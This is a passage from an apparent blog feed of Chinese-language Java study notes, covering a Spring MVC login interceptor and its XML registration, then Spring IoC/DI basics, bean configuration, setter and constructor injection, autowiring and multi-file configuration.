class="keyword">else</span>&#123;</span><br><span class="line">            request.setAttribute(<span class="string">&quot;msg&quot;</span>,<span class="string">&quot;用户名或密码不正确!&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;login&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>  2)开发拦截器的功能.实现HandlerInterceptor接口,重写preHandle()方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(request.getSession().getAttribute(<span class="string">&quot;users&quot;</span>) == <span class="literal">null</span>)&#123;</span><br><span class="line">          <span class="comment">//此时就是没有登录,打回到登录页面,并给出提示</span></span><br><span class="line">          request.setAttribute(<span class="string">&quot;msg&quot;</span>,<span class="string">&quot;您还没有登录,请先去登录!&quot;</span>);</span><br><span class="line">          request.getRequestDispatcher(<span class="string">&quot;/WEB-INF/jsp/login.jsp&quot;</span>).forward(request,response);</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;<span class="comment">//放行请求</span></span><br></pre></td></tr></table></figure><p>  2)在springmvc.xml文件中注册拦截器</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mvc:interceptors</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mvc:interceptor</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--映射要拦截的请求--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">mvc:mapping</span> <span class="attr">path</span>=<span class="string">&quot;/**&quot;</span>/&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--设置放行的请求--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">mvc:exclude-mapping</span> <span class="attr">path</span>=<span class="string">&quot;/showLogin&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">mvc:exclude-mapping</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">mvc:exclude-mapping</span> <span class="attr">path</span>=<span class="string">&quot;/login&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">mvc:exclude-mapping</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--配置具体的拦截器实现功能的类--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;com.hukaichao.interceptor.LoginInterceptor&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">mvc:interceptor</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">mvc:interceptors</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>java学习笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Spring框架</title>
    <link href="/2023/06/18/Spring%E6%A1%86%E6%9E%B6/"/>
    <url>/2023/06/18/Spring%E6%A1%86%E6%9E%B6/</url>
    
    <content type="html"><![CDATA[<h2 id="Spring功能"><a href="#Spring功能" class="headerlink" title="Spring功能"></a>Spring功能</h2><p>解决企业开发的难度。减轻对项目模块之间的管理，<br>类和类之间的管理， 帮助开发人员创建对象，管理对象之间的关系。<br>spring核心技术 ioc ， aop 。能实现模块之间，类之间的解耦合。</p><h2 id="IOC控制反转"><a href="#IOC控制反转" class="headerlink" title="IOC控制反转"></a>IOC控制反转</h2><h3 id="IOC介绍"><a href="#IOC介绍" class="headerlink" title="IOC介绍"></a>IOC介绍</h3><p>IoC (Inversion of Control) : 控制反转， 是一个理论，概念，思想。<br>描述：把对象的创建，赋值，管理工作都交给代码之外的容器实现， 也就是对象的创建是有其它外部资源完成。</p><p>控制： 创建对象，对象的属性赋值，对象之间的关系管理。<br>反转： 把原来的开发人员管理，创建对象的权限转移给代码之外的容器实现。 由容器代替开发人员管理对象。创建对象，给属性赋值。<br>正转：由开发人员在代码中，使用new 构造方法创建对象， 开发人员主动管理对象。<br>容器：是一个服务器软件， 一个框架（spring）</p><p>为什么要使用 ioc ： 目的就是减少对代码的改动， 也能实现不同的功能。 实现解耦合。 </p><p>java中创建对象有哪些方式：</p><ol><li>构造方法 ， new Student（）</li><li>反射</li><li>序列化（从磁盘文件中读取）</li><li>克隆</li><li>ioc ：容器创建对象（不需要new）</li><li>动态代理</li></ol><h3 id="IOC技术实现"><a href="#IOC技术实现" class="headerlink" title="IOC技术实现"></a>IOC技术实现</h3><p>DI 是ioc的技术实现，<br>DI（Dependency Injection） :依赖注入， 只需要在程序中提供要使用的对象名称就可以， 至于对象如何在容器中创建，赋值，查找都由容器内部实现。</p><h2 id="创建Spring项目"><a href="#创建Spring项目" class="headerlink" title="创建Spring项目"></a>创建Spring项目</h2><p>spring是使用的di实现了ioc的功能， spring底层创建对象，使用的是反射机制。<br>spring是一个容器，管理对象，给属性赋值， 底层是反射创建对象。</p><h3 id="项目结构"><a href="#项目结构" class="headerlink" title="项目结构"></a>项目结构</h3><p><img src="/upload/2022/03/image-63d3ea45aba34b97b3b777061ada20dc.png" alt="image.png"></p><h3 id="添加依赖"><a href="#添加依赖" class="headerlink" title="添加依赖"></a>添加依赖</h3><p>配置maven项目的pom.xml文件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--spring依赖--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-context<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.2.5.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="增加Spring的配置文件"><a href="#增加Spring的配置文件" class="headerlink" title="增加Spring的配置文件"></a>增加Spring的配置文件</h3><p>在resources下创建spring的xml文件beans.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">       http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--告诉spring创建对象</span></span><br><span class="line"><span class="comment">        声明bean ， 就是告诉spring要创建某个类的对象</span></span><br><span class="line"><span class="comment">        id:对象的自定义名称，唯一值。 spring通过这个名称找到对象</span></span><br><span class="line"><span class="comment">        class:类的全限定名称（不能是接口，因为spring是反射机制创建对象，必须使用类）</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        spring就完成 SomeService someService = new SomeServiceImpl();</span></span><br><span class="line"><span class="comment">        spring是把创建好的对象放入到map中， spring框架有一个map存放对象的。</span></span><br><span class="line"><span class="comment">           springMap.put(id的值， 对象）；</span></span><br><span class="line"><span class="comment">           例如 springMap.put(&quot;someService&quot;, new SomeServiceImpl());</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        一个bean标签声明一个对象。</span></span><br><span class="line"><span class="comment">    --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;someService&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.hukaichao.service.impl.SomeServiceImpl&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">       spring能创建一个非自定义类的对象， 创建一个存在的某个类的对象。</span></span><br><span class="line"><span class="comment">    --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;mydate&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.util.Date&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">   spring的配置文件</span></span><br><span class="line"><span class="comment">   1.beans : 是根标签，spring把java对象成为bean。</span></span><br><span class="line"><span class="comment">   2.spring-beans.xsd 是约束文件，和mybatis指定  dtd是一样的。</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure><h3 id="测试对象"><a href="#测试对象" class="headerlink" title="测试对象"></a>测试对象</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * spring默认创建对象的时间：在创建spring的容器时，会创建配置文件中的所有的对象。</span></span><br><span class="line"><span class="comment"> * spring创建对象：默认调用的是无参数构造方法</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test01</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="comment">//使用spring容器创建的对象</span></span><br><span class="line">   <span class="comment">//1.指定spring配置文件的名称</span></span><br><span class="line">   String config=<span class="string">&quot;beans.xml&quot;</span>;</span><br><span class="line">   <span class="comment">//2.创建表示spring容器的对象， ApplicationContext</span></span><br><span class="line">   <span class="comment">// ApplicationContext就是表示Spring容器，通过容器获取对象了</span></span><br><span class="line">   <span class="comment">// ClassPathXmlApplicationContext:表示从类路径中加载spring的配置文件</span></span><br><span class="line">   <span class="type">ApplicationContext</span> <span class="variable">ac</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(config);</span><br><span class="line"></span><br><span class="line">   <span class="comment">//从容器中获取某个对象， 你要调用对象的方法</span></span><br><span class="line">   <span class="comment">//getBean(&quot;配置文件中的bean的id值&quot;)</span></span><br><span class="line">   <span class="type">SomeService</span> <span class="variable">service</span> <span class="operator">=</span> (SomeService) ac.getBean(<span class="string">&quot;someService&quot;</span>);</span><br><span class="line"></span><br><span class="line">   <span class="comment">//使用spring创建好的对象</span></span><br><span class="line">   service.doSome();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>至此就成功创建了一个Spring项目，可以通过Spring容器创建对象了，在后面会将创建对象的代码进一步简化。</p><h2 id="给对象属性赋值（DI）"><a href="#给对象属性赋值（DI）" class="headerlink" title="给对象属性赋值（DI）"></a>给对象属性赋值（DI）</h2><p>di：依赖注入，表示创建对象，给属性赋值。</p><p>di的实现有两种：<br>1.在spring的配置文件中， 使用标签和属性完成，叫做基于XML的di实现<br>2.使用spring中的注解，完成属性赋值， 叫做基于注解的di实现</p><h3 id="xml注入"><a href="#xml注入" class="headerlink" title="xml注入"></a>xml注入</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--声明student对象</span></span><br><span class="line"><span class="comment">    注入：就是赋值的意思</span></span><br><span class="line"><span class="comment">    简单类型： spring中规定java的基本数据类型和String都是简单类型。</span></span><br><span class="line"><span class="comment">    di:给属性赋值</span></span><br><span class="line"><span class="comment">    1. set注入（设值注入） ：spring调用类的set方法， 你可以在set方法中完成属性赋值</span></span><br><span class="line"><span class="comment">     1）简单类型的set注入</span></span><br><span class="line"><span class="comment">        &lt;bean id=&quot;xx&quot; class=&quot;yyy&quot;&gt;</span></span><br><span class="line"><span class="comment">           &lt;property name=&quot;属性名字&quot; value=&quot;此属性的值&quot;/&gt;</span></span><br><span class="line"><span class="comment">           一个property只能给一个属性赋值</span></span><br><span class="line"><span class="comment">           &lt;property....&gt;</span></span><br><span class="line"><span class="comment">        &lt;/bean&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     2) 引用类型的set注入 ： spring调用类的set方法</span></span><br><span class="line"><span class="comment">       &lt;bean id=&quot;xxx&quot; class=&quot;yyy&quot;&gt;</span></span><br><span class="line"><span class="comment">          &lt;property name=&quot;属性名称&quot; ref=&quot;bean的id(对象的名称)&quot; /&gt;</span></span><br><span class="line"><span class="comment">       &lt;/bean&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   2.构造注入：spring调用类有参数构造方法，在创建对象的同时，在构造方法中给属性赋值。</span></span><br><span class="line"><span class="comment">      构造注入使用 &lt;constructor-arg&gt; 标签</span></span><br><span class="line"><span class="comment">      &lt;constructor-arg&gt; 标签：一个&lt;constructor-arg&gt;表示构造方法一个参数。</span></span><br><span class="line"><span class="comment">      &lt;constructor-arg&gt; 标签属性：</span></span><br><span class="line"><span class="comment">         name:表示构造方法的形参名</span></span><br><span class="line"><span class="comment">         index:表示构造方法的参数的位置，参数从左往右位置是 0，1，2的顺序</span></span><br><span class="line"><span class="comment">         value：构造方法的形参类型是简单类型的，使用value</span></span><br><span class="line"><span class="comment">         ref：构造方法的形参类型是引用类型的，使用ref</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;myStudent&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.hukaichao.ba02.Student&quot;</span> &gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;李四&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;age&quot;</span> <span class="attr">value</span>=<span class="string">&quot;26&quot;</span> /&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--引用类型--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;school&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;mySchool&quot;</span> /&gt;</span><span class="comment">&lt;!--setSchool(mySchool)--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--声明School对象--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;mySchool&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.hukaichao.ba02.School&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;北京大学&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;address&quot;</span> <span class="attr">value</span>=<span class="string">&quot;北京的海淀区&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--使用name属性实现构造注入--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;myStudent&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.hukaichao.ba03.Student&quot;</span> &gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">name</span>=<span class="string">&quot;myage&quot;</span> <span class="attr">value</span>=<span class="string">&quot;20&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">name</span>=<span class="string">&quot;mySchool&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;mySchool&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">name</span>=<span class="string">&quot;myname&quot;</span> <span class="attr">value</span>=<span class="string">&quot;周良&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="引用类型的自动注入"><a href="#引用类型的自动注入" class="headerlink" title="引用类型的自动注入"></a>引用类型的自动注入</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">   引用类型的自动注入： spring框架根据某些规则可以给引用类型赋值。·不用你在给引用类型赋值了</span></span><br><span class="line"><span class="comment">   使用的规则常用的是byName, byType.</span></span><br><span class="line"><span class="comment">   1.byName(按名称注入) ： java类中引用类型的属性名和spring容器中（配置文件）&lt;bean&gt;的id名称一样，</span></span><br><span class="line"><span class="comment">                          且数据类型是一致的，这样的容器中的bean，spring能够赋值给引用类型。</span></span><br><span class="line"><span class="comment">     语法：</span></span><br><span class="line"><span class="comment">     &lt;bean id=&quot;xx&quot; class=&quot;yyy&quot; autowire=&quot;byName&quot;&gt;</span></span><br><span class="line"><span class="comment">        简单类型属性赋值</span></span><br><span class="line"><span class="comment">     &lt;/bean&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   2.byType(按类型注入) ： java类中引用类型的数据类型和spring容器中（配置文件）&lt;bean&gt;的class属性</span></span><br><span class="line"><span class="comment">                          是同源关系的，这样的bean能够赋值给引用类型</span></span><br><span class="line"><span class="comment">     同源就是一类的意思：</span></span><br><span class="line"><span class="comment">      1.java类中引用类型的数据类型和bean的class的值是一样的。</span></span><br><span class="line"><span class="comment">      2.java类中引用类型的数据类型和bean的class的值父子类关系的。</span></span><br><span class="line"><span class="comment">      3.java类中引用类型的数据类型和bean的class的值接口和实现类关系的</span></span><br><span class="line"><span class="comment">     语法：</span></span><br><span class="line"><span class="comment">     &lt;bean id=&quot;xx&quot; class=&quot;yyy&quot; autowire=&quot;byType&quot;&gt;</span></span><br><span class="line"><span class="comment">        简单类型属性赋值</span></span><br><span class="line"><span class="comment">     &lt;/bean&gt;</span></span><br><span class="line"><span class="comment">     注意：在byType中， 在xml配置文件中声明bean只能有一个符合条件的，多余一个是错误的</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--byName--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;myStudent&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.hukaichao.ba04.Student&quot;</span>  <span class="attr">autowire</span>=<span class="string">&quot;byName&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;李四&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;age&quot;</span> <span class="attr">value</span>=<span class="string">&quot;26&quot;</span> /&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--引用类型--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--&lt;property name=&quot;school&quot; ref=&quot;mySchool&quot; /&gt;--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;myStudent&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.hukaichao.ba05.Student&quot;</span>  <span class="attr">autowire</span>=<span class="string">&quot;byType&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;张飒&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;age&quot;</span> <span class="attr">value</span>=<span class="string">&quot;26&quot;</span> /&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--引用类型--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--&lt;property name=&quot;school&quot; ref=&quot;mySchool&quot; /&gt;--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--声明School对象--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;school&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.hukaichao.ba04.School&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;清华大学&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;address&quot;</span> <span class="attr">value</span>=<span class="string">&quot;北京的海淀区&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="多配置文件"><a href="#多配置文件" class="headerlink" title="多配置文件"></a>多配置文件</h3><p> 多个配置优势</p><ol><li>每个文件的大小比一个文件要小很多。效率高</li><li>避免多人竞争带来的冲突。</li></ol><p>多文件的分配方式：</p><ol><li>按功能模块，一个模块一个配置文件</li><li>按类的功能，数据库相关的配置一个文件配置文件， 做事务的功能一个配置文件， 做service功能的一个配置文件等</li></ol><p>需要创建一个主配置文件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">     包含关系的配置文件：</span></span><br><span class="line"><span class="comment">     total表示主配置文件 ： 包含其他的配置文件的，主配置文件一般是不定义对象的。</span></span><br><span class="line"><span class="comment">     语法：&lt;import resource=&quot;其他配置文件的路径&quot; /&gt;</span></span><br><span class="line"><span class="comment">     关键字：&quot;classpath:&quot; 表示类路径（class文件所在的目录），</span></span><br><span class="line"><span class="comment">           在spring的配置文件中要指定其他文件的位置， 需要使用classpath，告诉spring到哪去加载读取文件。</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--加载的是文件列表--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">&lt;import resource=&quot;classpath:ba06/spring-school.xml&quot; /&gt;</span></span><br><span class="line"><span class="comment">&lt;import resource=&quot;classpath:ba06/spring-student.xml&quot; /&gt;</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">   在包含关系的配置文件中，可以通配符（*：表示任意字符）</span></span><br><span class="line"><span class="comment">   注意： 主的配置文件名称不能包含在通配符的范围内（不能叫做spring-total.xml）</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">import</span> <span class="attr">resource</span>=<span class="string">&quot;classpath:ba06/spring-*.xml&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>测试代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test01</span><span class="params">()</span>&#123;</span><br><span class="line">   <span class="comment">//加载的是总的文件</span></span><br><span class="line">    String config= <span class="string">&quot;ba06/total.xml&quot;</span>;</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">ac</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(config);</span><br><span class="line">    <span class="comment">//从容器中获取Student对象</span></span><br><span class="line">    <span class="type">Student</span> <span class="variable">myStudent</span> <span class="operator">=</span>  (Student) ac.getBean(<span class="string">&quot;myStudent&quot;</span>);</span><br><span class="line">    System.out.println(<span class="string">&quot;student对象=&quot;</span>+myStudent);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="注解注入"><a href="#注解注入" class="headerlink" title="注解注入"></a>注解注入</h3><p> 使用注解的步骤：</p><p>1.加入maven的依赖 spring-context ，在你加入spring-context的同时， 间接加入spring-aop的依赖。使用注解必须使用spring-aop依赖。（这个依赖和最开始加入的依赖是同一个）<br>2.在类中加入spring的注解（多个不同功能的注解）<br>3.在spring的配置文件中，加入一个组件扫描器的标签，说明注解在你的项目中的位置</p><p>   学习的注解：<br>     1.@Component<br>     2.@Respotory<br>     3.@Service<br>     4.@Controller<br>     5.@Value<br>     6.@Autowired<br>     7.@Resource</p><p>首先需要声明组件扫描器</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 